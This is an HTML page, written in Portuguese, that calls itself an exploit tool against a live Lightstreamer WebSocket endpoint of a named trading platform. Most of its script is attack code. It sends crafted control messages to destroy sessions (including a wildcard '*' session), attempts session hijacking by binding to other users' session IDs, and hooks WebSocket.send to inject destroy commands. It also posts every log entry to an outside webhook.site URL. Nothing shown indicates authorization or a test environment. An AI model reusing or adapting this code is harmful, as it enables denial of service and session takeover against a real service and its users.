<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lightstreamer - Control Commands Exploit</title>
    <style>
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: monospace;
            padding: 20px;
        }
        .critical { color: #ff00ff; font-weight: bold; }
        .success { color: #00ff00; }
        .error { color: #ff4444; }
        .info { color: #ffaa00; }
        .log {
            border-bottom: 1px solid #333;
            padding: 5px;
            margin: 5px 0;
            font-size: 12px;
        }
        button {
            background: #2a2a3e;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px 20px;
            margin: 5px;
            cursor: pointer;
        }
        button.danger {
            border-color: #ff4444;
            color: #ff4444;
        }
        button.danger:hover {
            background: #ff4444;
            color: #0a0a0a;
        }
        input {
            background: #1a1a2e;
            color: #00ff00;
            border: 1px solid #333;
            padding: 8px;
            font-family: monospace;
            width: 200px;
        }
    </style>
</head>
<body>
    <h1>🔴 Lightstreamer - Control Commands Exploit</h1>
    <p class="critical">⚠️ DESCOBERTA: Comando <strong>LS_op=destroy</strong> interceptado!</p>
    
    <div>
        <button onclick="testDestroyCommand()" class="danger">💀 TESTAR DESTROY COMMAND</button>
        <button onclick="testForceDisconnect()">🔌 Testar Force Disconnect</button>
        <button onclick="testSessionHijack()">🎭 Testar Session Hijack</button>
        <button onclick="injectControlCommands()">💉 Injetar Comandos de Controle</button>
        <button onclick="clearLogs()">🗑️ Limpar</button>
    </div>
    
    <div style="margin: 20px 0;">
        <input type="text" id="sessionId" placeholder="Session ID (se tiver)" style="width: 300px;">
        <button onclick="testWithSession()">Testar com Session ID</button>
    </div>
    
    <div id="logs" style="height: 400px; overflow-y: auto; background: #000; padding: 10px; margin-top: 20px;"></div>
    
    <script>
        const WEBHOOK = 'https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022';
        let ws = null;
        
        function addLog(message, type = 'info') {
            const logs = document.getElementById('logs');
            const div = document.createElement('div');
            div.className = `log ${type}`;
            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
            logs.appendChild(div);
            logs.scrollTop = logs.scrollHeight;
            
            fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ message, type, timestamp: Date.now() })
            }).catch(() => {});
        }
        
        // Testa o comando DESTROY (o que você interceptou)
        function testDestroyCommand() {
            addLog('💀 TESTANDO COMANDO DESTROY (CRÍTICO)', 'critical');
            
            ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
            
            ws.onopen = () => {
                addLog('✅ Conexão estabelecida', 'success');
                
                // O COMANDO QUE VOCÊ INTERCEPTOU
                const destroyCmd = "control\r\nLS_reqId=18&LS_op=destroy&LS_close_socket=true&LS_cause=api";
                
                ws.send(destroyCmd);
                addLog(`📤 ENVIADO: ${destroyCmd.replace(/\n/g, '\\n')}`, 'critical');
                
                // Variações do comando destroy
                setTimeout(() => {
                    const destroyVariations = [
                        "control\r\nLS_reqId=19&LS_op=destroy&LS_close_socket=true&LS_cause=malicious",
                        "control\r\nLS_reqId=20&LS_op=destroy&LS_close_socket=true&LS_session=*",
                        "control\r\nLS_op=destroy&LS_close_socket=true"
                    ];
                    
                    destroyVariations.forEach((cmd, i) => {
                        setTimeout(() => {
                            ws.send(cmd);
                            addLog(`📤 VARIAÇÃO ${i+1}: ${cmd.replace(/\n/g, '\\n')}`, 'info');
                        }, i * 2000);
                    });
                }, 1000);
            };
            
            ws.onmessage = (e) => {
                addLog(`📥 RESPOSTA: ${e.data}`, e.data.includes('ERROR') ? 'error' : 'success');
                
                if(e.data.includes('OK') || e.data.includes('CLOSED')) {
                    addLog('🎯 SESSÃO DESTRUÍDA COM SUCESSO!', 'critical');
                }
            };
            
            ws.onclose = (e) => {
                addLog(`🔌 Conexão fechada: ${e.code} - ${e.reason}`, 'error');
            };
        }
        
        // Testa force disconnect em sessões específicas
        function testForceDisconnect() {
            addLog('🔌 Testando force disconnect em diferentes sessões', 'info');
            
            ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
            
            ws.onopen = () => {
                // Tenta desconectar sessões específicas
                const sessionIds = ['S12345', 'S67890', 'session_demo_123', '*'];
                
                sessionIds.forEach((session, i) => {
                    setTimeout(() => {
                        const forceCmd = `control\r\nLS_reqId=${100+i}&LS_op=destroy&LS_close_socket=true&LS_session=${session}`;
                        ws.send(forceCmd);
                        addLog(`📤 Tentando destruir sessão: ${session}`, 'info');
                    }, i * 2000);
                });
            };
        }
        
        // Testa session hijack (tentar assumir sessão existente)
        function testSessionHijack() {
            addLog('🎭 Testando session hijack - tentando assumir sessão', 'critical');
            
            ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
            
            ws.onopen = () => {
                // Tenta bind em sessão existente
                const bindCommands = [
                    "bind_session\r\nLS_session=TARGET_SESSION&LS_adapter_set=PROXY_PUSH",
                    "control\r\nLS_op=bind&LS_session=*&LS_user=admin",
                    "create_session\r\nLS_session=TARGET_SESSION&LS_user=hijacked"
                ];
                
                bindCommands.forEach((cmd, i) => {
                    setTimeout(() => {
                        ws.send(cmd);
                        addLog(`📤 Hijack attempt: ${cmd.replace(/\n/g, '\\n')}`, 'critical');
                    }, i * 2000);
                });
            };
            
            ws.onmessage = (e) => {
                if(e.data.includes('SESSION')) {
                    addLog(`🔑 SESSION INFO LEAKED: ${e.data}`, 'critical');
                }
            };
        }
        
        // Injeta comandos de controle no WebSocket existente
        function injectControlCommands() {
            addLog('💉 Injetando comandos de controle no WebSocket', 'info');
            
            // Hook global para capturar e injetar comandos
            const originalSend = WebSocket.prototype.send;
            WebSocket.prototype.send = function(data) {
                addLog(`🎣 WebSocket.send interceptado: ${data}`, 'info');
                
                // Injeta comando destroy em todas as mensagens
                if(data.includes('create_session') || data.includes('subscribe')) {
                    const injected = data + "\r\ncontrol\r\nLS_op=destroy&LS_close_socket=true";
                    addLog(`💉 INJEÇÃO: ${injected}`, 'critical');
                    return originalSend.call(this, injected);
                }
                
                return originalSend.call(this, data);
            };
            
            addLog('✅ Hook de injeção ativado', 'success');
        }
        
        function testWithSession() {
            const sessionId = document.getElementById('sessionId').value;
            if(!sessionId) {
                addLog('❌ Digite um Session ID', 'error');
                return;
            }
            
            addLog(`🎯 Testando com Session ID: ${sessionId}`, 'critical');
            
            ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
            
            ws.onopen = () => {
                const attackCmds = [
                    `control\r\nLS_reqId=1&LS_op=destroy&LS_close_socket=true&LS_session=${sessionId}`,
                    `bind_session\r\nLS_session=${sessionId}&LS_adapter_set=PROXY_PUSH`,
                    `control\r\nLS_op=force&LS_session=${sessionId}`
                ];
                
                attackCmds.forEach((cmd, i) => {
                    setTimeout(() => {
                        ws.send(cmd);
                        addLog(`📤 ${cmd.replace(/\n/g, '\\n')}`, 'critical');
                    }, i * 1500);
                });
            };
            
            ws.onmessage = (e) => addLog(`📥 ${e.data}`, 'info');
        }
        
        function clearLogs() {
            document.getElementById('logs').innerHTML = '';
            if(ws) ws.close();
            addLog('Logs limpos', 'info');
        }
        
        addLog('✅ EXPLOIT TOOL CARREGADA', 'critical');
        addLog('🎯 Comando LS_op=destroy identificado - isso é uma vulnerabilidade CRÍTICA', 'critical');
        addLog('⚠️ Este comando pode destruir sessões de outros usuários (DoS)', 'error');
    </script>
</body>
</html>
